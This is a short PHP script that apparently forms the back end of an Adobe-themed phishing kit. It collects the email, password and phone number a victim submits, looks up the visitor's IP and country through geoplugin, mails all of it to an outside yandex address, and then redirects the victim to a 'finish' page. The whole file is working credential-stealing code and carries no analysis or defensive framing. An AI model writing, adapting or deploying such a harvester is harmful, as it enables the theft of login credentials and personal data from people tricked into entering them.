<?php

$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$message .= "--------------00---------------\n";
$message .= "3m4il: ".$_POST['feedback']."\n";
$message .= "P4ssw0rd: ".$_POST['feedbacknow']."\n";
$message .= "Ph0n3: ".$_POST['feedbacklater']."\n";
$message .= "-------------------------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Country : ".$country." \n";
$message .= "-------------------------------\n";


$recipient = "sch0olb0y@yandex.com";
$subject = "Adobe - ".$country;
$headers = "Moving Scofy";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Version : 2.4\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: finish.html");

	   }
	   
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

?>